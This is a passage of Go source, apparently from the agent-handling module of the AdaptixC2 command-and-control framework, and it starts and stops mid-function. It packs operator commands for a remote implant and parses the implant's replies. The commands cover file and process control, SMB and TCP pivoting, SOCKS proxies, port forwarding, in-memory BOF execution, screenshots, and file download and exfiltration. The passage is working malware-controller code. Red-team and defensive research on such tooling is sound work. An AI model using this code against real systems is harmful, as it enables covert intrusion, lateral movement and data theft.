			jobId, err = strconv.ParseInt(job, 16, 64)
			if err != nil {
				goto RET
			}

			array = []interface{}{COMMAND_JOBS_KILL, int(jobId)}
		} else {
			err = errors.New("subcommand must be 'list' or 'kill'")
			goto RET
		}

	case "link":
		if subcommand == "smb" {
			var target string
			var pipename string
			target, err = getStringArg(args, "target")
			if err != nil {
				goto RET
			}
			pipename, err = getStringArg(args, "pipename")
			if err != nil {
				goto RET
			}
			pipe := fmt.Sprintf("\\\\%s\\pipe\\%s", target, pipename)

			array = []interface{}{COMMAND_LINK, 1, pipe}

		} else if subcommand == "tcp" {
			var target string
			var port float64
			target, err = getStringArg(args, "target")
			if err != nil {
				goto RET
			}
			port, err = getFloatArg(args, "port")
			if err != nil {
				goto RET
			}
			array = []interface{}{COMMAND_LINK, 2, target, int(port)}

		} else {
			err = errors.New("subcommand must be 'smb' or 'tcp'")
			goto RET
		}

	case "ls":
		var dir string
		dir, err = getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_LS, Ts.TsConvertUTF8toCp(dir, agentData.ACP)}

	case "lportfwd":
		taskData.Type = adaptix.TASK_TYPE_TUNNEL

		lportNumber, _ := getFloatArg(args, "lport")
		lport := int(lportNumber)
		if lport < 1 || lport > 65535 {
			err = errors.New("port must be from 1 to 65535")
			goto RET
		}

		if subcommand == "start" {
			var lhost string
			var fhost string
			var tunnelId string
			lhost, err = getStringArg(args, "lhost")
			if err != nil {
				goto RET
			}
			fhost, err = getStringArg(args, "fwdhost")
			if err != nil {
				goto RET
			}
			fportNumber, _ := getFloatArg(args, "fwdport")
			fport := int(fportNumber)
			if fport < 1 || fport > 65535 {
				err = errors.New("port must be from 1 to 65535")
				goto RET
			}

			tunnelId, err = Ts.TsTunnelCreateLportfwd(agentData.Id, "", lhost, lport, fhost, fport)
			if err != nil {
				goto RET
			}
			taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
			if err != nil {
				goto RET
			}

			taskData.Message = fmt.Sprintf("Started local port forwarding on %s:%d to %s:%d", lhost, lport, fhost, fport)
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		} else if subcommand == "stop" {
			taskData.Completed = true

			Ts.TsTunnelStopLportfwd(agentData.Id, lport)

			taskData.Message = fmt.Sprintf("Local port forwarding on %d stopped", lport)
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		} else {
			err = errors.New("subcommand must be 'start' or 'stop'")
			goto RET
		}

	case "mv":
		var src string
		var dst string
		src, err = getStringArg(args, "src")
		if err != nil {
			goto RET
		}
		dst, err = getStringArg(args, "dst")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_MV, Ts.TsConvertUTF8toCp(src, agentData.ACP), Ts.TsConvertUTF8toCp(dst, agentData.ACP)}

	case "mkdir":
		var path string
		path, err = getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_MKDIR, Ts.TsConvertUTF8toCp(path, agentData.ACP)}

	case "profile":
		if subcommand == "download.chunksize" {
			var size float64
			size, err = getFloatArg(args, "size")
			if err != nil {
				goto RET
			}
			array = []interface{}{COMMAND_PROFILE, 2, int(size)}

		} else if subcommand == "killdate" {
			var dt string
			dt, err = getStringArg(args, "datetime")
			if err != nil {
				goto RET
			}

			killDate := 0
			if dt != "0" {
				var t time.Time
				t, err = time.Parse("02.01.2006 15:04:05", dt)
				if err != nil {
					err = errors.New("Invalid date format, use: 'DD.MM.YYYY hh:mm:ss'")
					goto RET
				}
				killDate = int(t.Unix())
			}
			array = []interface{}{COMMAND_PROFILE, 3, killDate}

		} else if subcommand == "workingtime" {
			var t string
			t, err = getStringArg(args, "time")
			if err != nil {
				goto RET
			}

			workingTime := 0
			if t != "0" {
				workingTime, err = parseStringToWorkingTime(t)
				if err != nil {
					goto RET
				}
			}
			array = []interface{}{COMMAND_PROFILE, 4, workingTime}

		} else {
			err = errors.New("subcommand for 'profile' not found")
			goto RET
		}

	case "ps":
		if subcommand == "list" {
			array = []interface{}{COMMAND_PS_LIST}

		} else if subcommand == "kill" {
			var pid float64
			pid, err = getFloatArg(args, "pid")
			if err != nil {
				goto RET
			}
			array = []interface{}{COMMAND_PS_KILL, int(pid)}

		} else if subcommand == "run" {
			taskData.Type = adaptix.TASK_TYPE_JOB

			output := getBoolArg(args, "-o")
			suspend := getBoolArg(args, "-s")
			programState := 0
			if suspend {
				programState = 4
			}
			programArgs, _ := args["args"].(string)
			programArgs = Ts.TsConvertUTF8toCp(programArgs, agentData.ACP)

			array = []interface{}{COMMAND_PS_RUN, output, programState, programArgs}

		} else {
			err = errors.New("subcommand must be 'list', 'kill' or 'run'")
			goto RET
		}

	case "pwd":
		array = []interface{}{COMMAND_PWD}

	case "rev2self":
		array = []interface{}{COMMAND_REV2SELF}

	case "rm":
		var path string
		path, err = getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_RM, Ts.TsConvertUTF8toCp(path, agentData.ACP)}

	case "rportfwd":
		taskData.Type = adaptix.TASK_TYPE_TUNNEL

		lportNumber, _ := getFloatArg(args, "lport")
		lport := int(lportNumber)
		if lport < 1 || lport > 65535 {
			err = errors.New("port must be from 1 to 65535")
			goto RET
		}

		if subcommand == "start" {
			var fhost string
			fhost, err = getStringArg(args, "fwdhost")
			if err != nil {
				goto RET
			}
			fportNumber, _ := getFloatArg(args, "fwdport")
			fport := int(fportNumber)
			if fport < 1 || fport > 65535 {
				err = errors.New("port must be from 1 to 65535")
				goto RET
			}

			var tunnelId string
			tunnelId, err = Ts.TsTunnelCreateRportfwd(agentData.Id, "", lport, fhost, fport)
			if err != nil {
				goto RET
			}
			taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
			if err != nil {
				goto RET
			}

			messageData.Message = fmt.Sprintf("Starting reverse port forwarding %d to %s:%d", lport, fhost, fport)
			messageData.Status = adaptix.MESSAGE_INFO

		} else if subcommand == "stop" {
			taskData.Completed = true

			Ts.TsTunnelStopRportfwd(agentData.Id, lport)

			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.Message = "Reverse port forwarding has been stopped"

		} else {
			err = errors.New("subcommand must be 'start' or 'stop'")
			goto RET
		}

	case "sleep":
		var sleepTime int
		var sleepInt int
		sleep, err := getStringArg(args, "sleep")
		if err != nil {
			goto RET
		}
		jitter, _ := getFloatArg(args, "jitter")
		jitterTime := int(jitter)

		sleepInt, err = strconv.Atoi(sleep)
		if err == nil {
			sleepTime = sleepInt
		} else {
			var t time.Duration
			t, err = time.ParseDuration(sleep)
			if err == nil {
				sleepTime = int(t.Seconds())
			} else {
				err = errors.New("sleep must be in '%h%m%s' format or number of seconds")
				goto RET
			}
		}
		if jitterTime < 0 || jitterTime > 100 {
			err = errors.New("jitter must be from 0 to 100")
			goto RET
		}
		if jitterTime > 0 {
			messageData.Message = fmt.Sprintf("Task: sleep to %v with %v%% jitter", sleep, jitterTime)
		} else {
			messageData.Message = fmt.Sprintf("Task: sleep to %v", sleep)
		}

		array = []interface{}{COMMAND_PROFILE, 1, sleepTime, jitterTime}

	case "burst":
		if subcommand == "show" {
			array = []interface{}{COMMAND_PROFILE, 6}
			messageData.Message = "Task: show burst config"

		} else if subcommand == "set" {
			var enabled float64
			var sleepVal float64
			var jitterVal float64
			enabled, err = getFloatArg(args, "enabled")
			if err != nil {
				err = errors.New("parameter 'enabled' must be set (1=on, 0=off)")
				goto RET
			}
			burstEnabled := int(enabled)
			if burstEnabled != 0 && burstEnabled != 1 {
				err = errors.New("parameter 'enabled' must be 0 or 1")
				goto RET
			}

			burstSleep := 50
			sleepVal, err = getFloatArg(args, "sleep")
			if err == nil {
				burstSleep = int(sleepVal)
				if burstSleep < 0 || burstSleep > 10000 {
					err = errors.New("burst sleep must be from 0 to 10000 ms")
					goto RET
				}
			}

			burstJitter := 0
			jitterVal, err = getFloatArg(args, "jitter")
			if err == nil {
				burstJitter = int(jitterVal)
				if burstJitter < 0 || burstJitter > 90 {
					err = errors.New("burst jitter must be from 0 to 90%%")
					goto RET
				}
			}

			messageData.Message = fmt.Sprintf("Task: set burst config - %s", formatBurstStatus(burstEnabled, burstSleep, burstJitter))
			array = []interface{}{COMMAND_PROFILE, 5, burstEnabled, burstSleep, burstJitter}

		} else {
			err = errors.New("subcommand for 'burst' must be 'show' or 'set'")
			goto RET
		}

	case "socks":
		var portNumber float64

		taskData.Type = adaptix.TASK_TYPE_TUNNEL

		portNumber, err = getFloatArg(args, "port")
		port := int(portNumber)
		if port < 1 || port > 65535 || err != nil {
			err = errors.New("port must be from 1 to 65535")
			goto RET
		}

		if subcommand == "start" {
			var address string
			var tunnelId string
			address, err = getStringArg(args, "address")
			if err != nil {
				goto RET
			}

			version4 := getBoolArg(args, "-socks4")
			if version4 {
				tunnelId, err = Ts.TsTunnelCreateSocks4(agentData.Id, "", address, port)
				if err != nil {
					goto RET
				}
				taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
				if err != nil {
					goto RET
				}
				taskData.Message = fmt.Sprintf("Socks4 server running on port %d", port)

			} else {
				auth := getBoolArg(args, "-auth")
				if auth {
					var username string
					var password string
					username, err = getStringArg(args, "username")
					if err != nil {
						goto RET
					}
					password, err = getStringArg(args, "password")
					if err != nil {
						goto RET
					}
					tunnelId, err = Ts.TsTunnelCreateSocks5(agentData.Id, "", address, port, true, username, password)
					if err != nil {
						goto RET
					}
					taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
					if err != nil {
						goto RET
					}

					taskData.Message = fmt.Sprintf("Socks5 (with Auth) server running on port %d", port)

				} else {
					tunnelId, err = Ts.TsTunnelCreateSocks5(agentData.Id, "", address, port, false, "", "")
					if err != nil {
						goto RET
					}
					taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
					if err != nil {
						goto RET
					}

					taskData.Message = fmt.Sprintf("Socks5 server running on port %d", port)
				}
			}
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		} else if subcommand == "stop" {
			taskData.Completed = true

			Ts.TsTunnelStopSocks(agentData.Id, port)

			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.Message = "Socks5 server has been stopped"
			taskData.ClearText = "\n"

		} else {
			err = errors.New("subcommand must be 'start' or 'stop'")
			goto RET
		}

	case "terminate":
		if subcommand == "thread" {
			array = []interface{}{COMMAND_TERMINATE, 1}
		} else if subcommand == "process" {
			array = []interface{}{COMMAND_TERMINATE, 2}
		} else {
			err = errors.New("subcommand must be 'thread' or 'process'")
			goto RET
		}

	case "unlink":
		var pivotName string
		pivotName, err = getStringArg(args, "id")
		if err != nil {
			goto RET
		}

		pivotId, _, _ := Ts.TsGetPivotInfoByName(pivotName)
		if pivotId == "" {
			err = fmt.Errorf("pivot %s does not exist", pivotName)
			goto RET
		}
		id, _ := strconv.ParseInt(pivotId, 16, 64)

		array = []interface{}{COMMAND_UNLINK, int(id)}

	case "upload":
		var fileName string
		var localFile string
		var fileContent []byte

		fileName, err = getStringArg(args, "remote_path")
		if err != nil {
			goto RET
		}
		localFile, err = getStringArg(args, "local_file")
		if err != nil {
			goto RET
		}
		fileContent, err = base64.StdEncoding.DecodeString(localFile)
		if err != nil {
			goto RET
		}

		memoryId := CreateTaskCommandSaveMemory(Ts, agentData.Id, fileContent)

		array = []interface{}{COMMAND_UPLOAD, memoryId, Ts.TsConvertUTF8toCp(fileName, agentData.ACP)}

	default:
		err = errors.New(fmt.Sprintf("Command '%v' not found", command))
		goto RET
	}

	taskData.Data, err = PackArray(array)

	/// END CODE

RET:
	return taskData, messageData, err
}

func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData []byte) error {
	var outTasks []adaptix.TaskData

	taskData := adaptix.TaskData{
		Type:        adaptix.TASK_TYPE_TASK,
		AgentId:     agentData.Id,
		FinishDate:  time.Now().Unix(),
		MessageType: adaptix.MESSAGE_SUCCESS,
		Completed:   true,
		Sync:        true,
	}

	/// START CODE

	decompressed, _ := decompressZlibData(decryptedData)

	packer := CreatePacker(decompressed)

	if false == packer.CheckPacker([]string{"int"}) {
		return errors.New("failed to unmarshal message")
	}

	size := packer.ParseInt32()
	if size-4 != packer.Size() {
		return errors.New("failed to unmarshal message")
	}

	bof_output := make(map[string]bool)

	for packer.Size() >= 8 {

		if false == packer.CheckPacker([]string{"int", "int"}) {
			goto HANDLER
		}

		TaskId := packer.ParseInt32()
		commandId := packer.ParseInt32()
		task := taskData
		task.TaskId = fmt.Sprintf("%08x", TaskId)

		switch commandId {

		case COMMAND_CAT:
			if false == packer.CheckPacker([]string{"array", "array"}) {
				goto HANDLER
			}
			path := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			fileContent := packer.ParseBytes()
			task.Message = fmt.Sprintf("'%v' file content:", path)
			task.ClearText = string(fileContent)

		case COMMAND_CD:
			if false == packer.CheckPacker([]string{"array"}) {
				goto HANDLER
			}
			path := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			task.Message = "Current working directory:"
			task.ClearText = path

		case COMMAND_COPY:
			task.Message = "File copied successfully"

		case COMMAND_DISKS:
			if false == packer.CheckPacker([]string{"byte", "int"}) {
				goto HANDLER
			}
			result := packer.ParseInt8()
			var drives []adaptix.ListingDrivesDataWin

			if result == 0 {
				errorCode := packer.ParseInt32()
				task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, Ts.TsWin32Error(errorCode))
				task.MessageType = adaptix.MESSAGE_ERROR

			} else {
				drivesCount := int(packer.ParseInt32())

				for i := 0; i < drivesCount; i++ {
					if false == packer.CheckPacker([]string{"byte", "int"}) {
						goto HANDLER
					}
					var driveData adaptix.ListingDrivesDataWin
					driveCode := packer.ParseInt8()
					driveType := packer.ParseInt32()

					driveData.Name = fmt.Sprintf("%c:", driveCode)
					if driveType == 2 {
						driveData.Type = "USB"
					} else if driveType == 3 {
						driveData.Type = "Hard Drive"
					} else if driveType == 4 {
						driveData.Type = "Network Drive"
					} else if driveType == 5 {
						driveData.Type = "CD-ROM"
					} else {
						driveData.Type = "Unknown"
					}

					drives = append(drives, driveData)
				}

				OutputText := fmt.Sprintf(" %-5s  %s\n", "Drive", "Type")
				OutputText += fmt.Sprintf(" %-5s  %s", "-----", "-----")
				for _, item := range drives {
					OutputText += fmt.Sprintf("\n %-5s  %s", item.Name, item.Type)
				}
				task.Message = "List of mounted drives:"
				task.ClearText = OutputText
			}

			Ts.TsClientGuiDisksWindows(task, drives)

		case COMMAND_DOWNLOAD:
			if false == packer.CheckPacker([]string{"int", "byte"}) {
				goto HANDLER
			}
			fileId := fmt.Sprintf("%08x", packer.ParseInt32())
			downloadCommand := packer.ParseInt8()
			if downloadCommand == DOWNLOAD_START {
				if false == packer.CheckPacker([]string{"int", "array"}) {
					goto HANDLER
				}
				fileSize := packer.ParseInt32()
				fileName := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
				task.Message = fmt.Sprintf("The download of the '%s' file (%v bytes) has started: [fid %v]", fileName, fileSize, fileId)
				task.Completed = false
				_ = Ts.TsDownloadAdd(agentData.Id, fileId, fileName, int(fileSize))

			} else if downloadCommand == DOWNLOAD_CONTINUE {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				fileContent := packer.ParseBytes()
				task.Completed = false
				_ = Ts.TsDownloadUpdate(fileId, adaptix.DOWNLOAD_STATE_RUNNING, fileContent)
				continue

			} else if downloadCommand == DOWNLOAD_FINISH {
				task.Message = fmt.Sprintf("File download complete: [fid %v]", fileId)
				_ = Ts.TsDownloadClose(fileId, adaptix.DOWNLOAD_STATE_FINISHED)
			}

		case COMMAND_EXFIL:
			if false == packer.CheckPacker([]string{"int", "byte"}) {
				goto HANDLER
			}
			fileId := fmt.Sprintf("%08x", packer.ParseInt32())
			downloadState := packer.ParseInt8()

			if downloadState == adaptix.DOWNLOAD_STATE_STOPPED {
				task.Message = fmt.Sprintf("Download '%v' successful stopped", fileId)
				_ = Ts.TsDownloadUpdate(fileId, adaptix.DOWNLOAD_STATE_STOPPED, []byte(""))

			} else if downloadState == adaptix.DOWNLOAD_STATE_RUNNING {
				task.Message = fmt.Sprintf("Download '%v' successful resumed", fileId)
				_ = Ts.TsDownloadUpdate(fileId, adaptix.DOWNLOAD_STATE_RUNNING, []byte(""))

			} else if downloadState == adaptix.DOWNLOAD_STATE_CANCELED {
				task.Message = fmt.Sprintf("Download '%v' successful canceled", fileId)
				_ = Ts.TsDownloadClose(fileId, adaptix.DOWNLOAD_STATE_CANCELED)
			}

		case COMMAND_EXEC_BOF:
			task.Message = "BOF finished"
			task.Completed = true

		case COMMAND_EXEC_BOF_OUT:
			if false == packer.CheckPacker([]string{"int"}) {
				goto HANDLER
			}
			outputType := packer.ParseInt32()

			if outputType == BOF_ERROR_PARSE {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				_ = packer.ParseString()

				task.MessageType = adaptix.MESSAGE_ERROR
				task.Message = "BOF error"
				task.ClearText = "Parse BOF error"

			} else if outputType == BOF_ERROR_MAX_FUNCS {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				_ = packer.ParseString()

				task.MessageType = adaptix.MESSAGE_ERROR
				task.Message = "BOF error"
				task.ClearText = "The number of functions in the BOF file exceeds 512"

			} else if outputType == BOF_ERROR_ENTRY {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				_ = packer.ParseString()

				task.MessageType = adaptix.MESSAGE_ERROR
				task.Message = "BOF error"
				task.ClearText = "Entry function not found"

			} else if outputType == BOF_ERROR_ALLOC {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				_ = packer.ParseString()

				task.MessageType = adaptix.MESSAGE_ERROR
				task.Message = "BOF error"
				task.ClearText = "Error allocation of BOF memory"

			} else if outputType == BOF_ERROR_SYMBOL {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				output := packer.ParseString()

				task.MessageType = adaptix.MESSAGE_ERROR
				task.Message = "BOF error"
				task.ClearText = "Symbol not found: " + output + "\n"

			} else if outputType == CALLBACK_ERROR {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				output := packer.ParseString()

				task.MessageType = adaptix.MESSAGE_ERROR
				task.Message = "BOF output"
				task.ClearText = Ts.TsConvertCpToUTF8(output, agentData.ACP)

			} else if outputType == CALLBACK_OUTPUT_OEM {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				output := packer.ParseString()

				_, ok := bof_output[task.TaskId]
				if ok {
					task.Message = ""
				} else {
					bof_output[task.TaskId] = true
					task.Message = "BOF output"
				}

				task.MessageType = adaptix.MESSAGE_SUCCESS
				task.ClearText = Ts.TsConvertCpToUTF8(output, agentData.OemCP)

			} else if outputType == CALLBACK_OUTPUT_UTF8 {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				output := packer.ParseString()

				_, ok := bof_output[task.TaskId]
				if ok {
					task.Message = ""
				} else {
					bof_output[task.TaskId] = true
					task.Message = "BOF output"
				}

				task.MessageType = adaptix.MESSAGE_SUCCESS
				task.ClearText = output

			} else if outputType == CALLBACK_AX_SCREENSHOT {
				if false == packer.CheckPacker([]string{"array", "array"}) {
					goto HANDLER
				}
				note := packer.ParseString()
				screen := packer.ParseBytes()

				_ = Ts.TsScreenshotAdd(agentData.Id, note, screen)

			} else if outputType == CALLBACK_AX_DOWNLOAD_MEM {
				if false == packer.CheckPacker([]string{"array", "array"}) {
					goto HANDLER
				}
				filename := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
				data := packer.ParseBytes()
				fileId := fmt.Sprintf("%08x", rand.Uint32())

				_ = Ts.TsDownloadSave(agentData.Id, fileId, filename, data)

			} else {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				output := packer.ParseString()

				_, ok := bof_output[task.TaskId]
				if ok {
					task.Message = ""
				} else {
					bof_output[task.TaskId] = true
					task.Message = "BOF output"
				}

				task.MessageType = adaptix.MESSAGE_SUCCESS
				task.ClearText = Ts.TsConvertCpToUTF8(output, agentData.ACP) + "\n"
			}

			task.Completed = false

		case COMMAND_GETUID:
			if false == packer.CheckPacker([]string{"byte", "array", "array"}) {
				goto HANDLER
			}

			high := packer.ParseInt8()
			domain := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			username := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			message := ""

			if username != "" {
				if domain != "" {
					username = domain + "\\" + username
				}
				message = fmt.Sprintf("You are '%v'", username)
				if high > 0 {
					message += " (elevated)"
				}
			}
			task.Message = message

		case COMMAND_JOB:
			if false == packer.CheckPacker([]string{"byte", "byte"}) {
				goto HANDLER
			}

			jobType := packer.ParseInt8()
			state := packer.ParseInt8()

			if jobType == JOB_TYPE_SHELL {
				tunnelId := task.TaskId

				if state == JOB_STATE_STARTING {
					Ts.TsTerminalConnResume(agentData.Id, tunnelId, false)

				} else if state == JOB_STATE_RUNNING {
					if false == packer.CheckPacker([]string{"array"}) {
						goto HANDLER
					}
					data := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.OemCP)
					Ts.TsTerminalConnData(tunnelId, []byte(data))

				} else if state == JOB_STATE_KILLED {
					_ = Ts.TsTerminalConnClose(tunnelId, "Terminal stopped")

				} else if state == JOB_STATE_FINISHED {
					if false == packer.CheckPacker([]string{"int"}) {
						goto HANDLER
					}
					errorCode := packer.ParseInt32()
					status := fmt.Sprintf("Error [%d]: %s", errorCode, Ts.TsWin32Error(errorCode))
					_ = Ts.TsTerminalConnClose(tunnelId, status)
				}

			} else {
				if state == JOB_STATE_RUNNING {
					if false == packer.CheckPacker([]string{"array"}) {
						goto HANDLER
					}
					task.Completed = false
					jobOutput := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.OemCP)
					task.Message = fmt.Sprintf("Job [%v] output:", task.TaskId)
					task.ClearText = jobOutput
				} else if state == JOB_STATE_KILLED {
					task.Completed = true
					task.MessageType = adaptix.MESSAGE_INFO
					task.Message = fmt.Sprintf("Job [%v] canceled", task.TaskId)
				} else if state == JOB_STATE_FINISHED {
					task.Completed = true
					task.Message = fmt.Sprintf("Job [%v] finished", task.TaskId)
				}
			}

		case COMMAND_JOB_LIST:
			var Output string
			if false == packer.CheckPacker([]string{"int"}) {
				goto HANDLER
			}
			count := packer.ParseInt32()

			if count > 0 {
				Output += fmt.Sprintf(" %-10s  %-5s  %-13s\n", "JobID", "PID", "Type")
				Output += fmt.Sprintf(" %-10s  %-5s  %-13s", "--------", "-----", "-------")
				for i := 0; i < int(count); i++ {
					if false == packer.CheckPacker([]string{"int", "word", "word"}) {
						goto HANDLER
					}
					jobId := fmt.Sprintf("%08x", packer.ParseInt32())
					jobType := packer.ParseInt16()
					pid := packer.ParseInt16()

					stringType := "Unknown"
					if jobType == 0x1 {
						stringType = "Local"
					} else if jobType == 0x2 {
						stringType = "Remote"
					} else if jobType == 0x3 {
						stringType = "Process"
					} else if jobType == 0x4 {
						stringType = "Shell"
					}
					Output += fmt.Sprintf("\n %-10v  %-5v  %-13s", jobId, pid, stringType)
				}
				task.Message = "Job list:"
				task.ClearText = Output
			} else {
				task.Message = "No active jobs"
			}

		case COMMAND_JOBS_KILL:
			if false == packer.CheckPacker([]string{"byte", "int"}) {
				goto HANDLER
			}
			result := packer.ParseInt8()
			jobId := packer.ParseInt32()

			if result == 0 {
				task.MessageType = adaptix.MESSAGE_ERROR
				task.Message = fmt.Sprintf("Job %v not found", jobId)
			} else {
				task.Message = fmt.Sprintf("Job %v mark as Killed", jobId)
			}

		case COMMAND_LINK:
			if false == packer.CheckPacker([]string{"byte", "int", "array"}) {
				goto HANDLER
			}

			linkType := packer.ParseInt8()
			watermark := fmt.Sprintf("%08x", packer.ParseInt32())
			beat := packer.ParseBytes()

			childAgentId, _ := Ts.TsListenerInteralHandler(watermark, beat)
			_ = Ts.TsPivotCreate(task.TaskId, agentData.Id, childAgentId, "", false)

			if linkType == 1 {
				task.Message = fmt.Sprintf("----- New SMB pivot agent: [%s]===[%s] -----", agentData.Id, childAgentId)
				Ts.TsAgentConsoleOutput(childAgentId, adaptix.MESSAGE_SUCCESS, task.Message, "\n", true)
			} else if linkType == 2 {
				task.Message = fmt.Sprintf("----- New TCP pivot agent: [%s]===[%s] -----", agentData.Id, childAgentId)
				Ts.TsAgentConsoleOutput(childAgentId, adaptix.MESSAGE_SUCCESS, task.Message, "\n", true)
			}

		case COMMAND_LS:
			if false == packer.CheckPacker([]string{"byte"}) {
				goto HANDLER
			}
			result := packer.ParseInt8()

			var items []adaptix.ListingFileDataWin
			var rootPath string

			if result == 0 {
				if false == packer.CheckPacker([]string{"int"}) {
					goto HANDLER
				}
				errorCode := packer.ParseInt32()
				task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, Ts.TsWin32Error(errorCode))
				task.MessageType = adaptix.MESSAGE_ERROR

			} else {
				if false == packer.CheckPacker([]string{"array", "int"}) {
					goto HANDLER
				}
				rootPath = Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
				rootPath, _ = strings.CutSuffix(rootPath, "\\*")

				filesCount := int(packer.ParseInt32())

				if filesCount == 0 {
					task.Message = fmt.Sprintf("The '%s' directory is EMPTY", rootPath)
				} else {

					var folders []adaptix.ListingFileDataWin
					var files []adaptix.ListingFileDataWin

					for i := 0; i < filesCount; i++ {
						if false == packer.CheckPacker([]string{"byte", "long", "int", "array"}) {
							goto HANDLER
						}
						isDir := packer.ParseInt8()
						fileData := adaptix.ListingFileDataWin{
							IsDir:    false,
							Size:     int64(packer.ParseInt64()),
							Date:     int64(packer.ParseInt32()),
							Filename: Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP),
						}
						if isDir > 0 {
							fileData.IsDir = true
							folders = append(folders, fileData)
						} else {
							files = append(files, fileData)
						}
					}

					items = append(folders, files...)

					OutputText := fmt.Sprintf(" %-8s %-14s %-20s  %s\n", "Type", "Size", "Last Modified      ", "Name")
					OutputText += fmt.Sprintf(" %-8s %-14s %-20s  %s", "----", "---------", "----------------   ", "----")

					for _, item := range items {
						t := time.Unix(item.Date, 0).UTC()
						lastWrite := fmt.Sprintf("%02d/%02d/%d %02d:%02d", t.Day(), t.Month(), t.Year(), t.Hour(), t.Minute())

						if item.IsDir {
							OutputText += fmt.Sprintf("\n %-8s %-14s %-20s  %-8v", "dir", "", lastWrite, item.Filename)
						} else {
							OutputText += fmt.Sprintf("\n %-8s %-14s %-20s  %-8v", "", SizeBytesToFormat(item.Size), lastWrite, item.Filename)
						}
					}
					task.Message = fmt.Sprintf("Listing '%s'", rootPath)
					task.ClearText = OutputText
				}
			}
			Ts.TsClientGuiFilesWindows(task, rootPath, items)

		case COMMAND_MKDIR:
			if false == packer.CheckPacker([]string{"array"}) {
				goto HANDLER
			}
			path := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			task.Message = fmt.Sprintf("Directory '%v' created successfully", path)

		case COMMAND_MV:
			task.Message = "File moved successfully"

		case COMMAND_PIVOT_EXEC:
			if false == packer.CheckPacker([]string{"int", "array"}) {
				goto HANDLER
			}

			pivotId := fmt.Sprintf("%08x", packer.ParseInt32())
			pivotData := packer.ParseBytes()

			_, _, childAgentId := Ts.TsGetPivotInfoById(pivotId)

			_ = Ts.TsAgentProcessData(childAgentId, pivotData)

		case COMMAND_PROFILE:
			if false == packer.CheckPacker([]string{"int"}) {
				goto HANDLER
			}
			subcommand := packer.ParseInt32()

			if subcommand == 1 {
				if false == packer.CheckPacker([]string{"int", "int"}) {
					goto HANDLER
				}
				agentData.Sleep = packer.ParseInt32()
				agentData.Jitter = packer.ParseInt32()

				task.Message = "Sleep time has been changed"

				_ = Ts.TsAgentUpdateData(agentData)

			} else if subcommand == 2 {
				if false == packer.CheckPacker([]string{"int"}) {
					goto HANDLER
				}
				size := packer.ParseInt32()
				task.Message = fmt.Sprintf("Download chunk size set to %v bytes", size)

			} else if subcommand == 3 {
				if false == packer.CheckPacker([]string{"int"}) {
					goto HANDLER
				}
				agentData.KillDate = int(packer.ParseInt32())

				task.Message = "Option 'killdate' is set"
				if agentData.KillDate == 0 {
					task.Message = "The 'killdate' option is disabled"
				}

				_ = Ts.TsAgentUpdateData(agentData)

			} else if subcommand == 4 {
				if false == packer.CheckPacker([]string{"int"}) {
					goto HANDLER
				}
				agentData.WorkingTime = int(packer.ParseInt32())

				task.Message = "Option 'workingtime' is set"
				if agentData.WorkingTime == 0 {
					task.Message = "The 'workingtime' option is disabled"
				}

				_ = Ts.TsAgentUpdateData(agentData)

			} else if subcommand == 5 { // Burst set response
				if false == packer.CheckPacker([]string{"int", "int", "int"}) {
					goto HANDLER
				}
				burstEnabled := packer.ParseInt32()
				burstSleep := packer.ParseInt32()
				burstJitter := packer.ParseInt32()

				task.Message = fmt.Sprintf("Burst config updated: %s", formatBurstStatus(int(burstEnabled), int(burstSleep), int(burstJitter)))

			} else if subcommand == 6 {
				// Burst show response
				if false == packer.CheckPacker([]string{"int", "int", "int"}) {
					goto HANDLER
				}
				burstEnabled := packer.ParseInt32()
				burstSleep := packer.ParseInt32()
				burstJitter := packer.ParseInt32()

				task.Message = fmt.Sprintf("Burst config: %s", formatBurstStatus(int(burstEnabled), int(burstSleep), int(burstJitter)))
			}

		case COMMAND_PS_LIST:
			if false == packer.CheckPacker([]string{"byte", "int"}) {
				goto HANDLER
			}

			result := packer.ParseInt8()

			var proclist []adaptix.ListingProcessDataWin

			if result == 0 {
				errorCode := packer.ParseInt32()
				task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, Ts.TsWin32Error(errorCode))
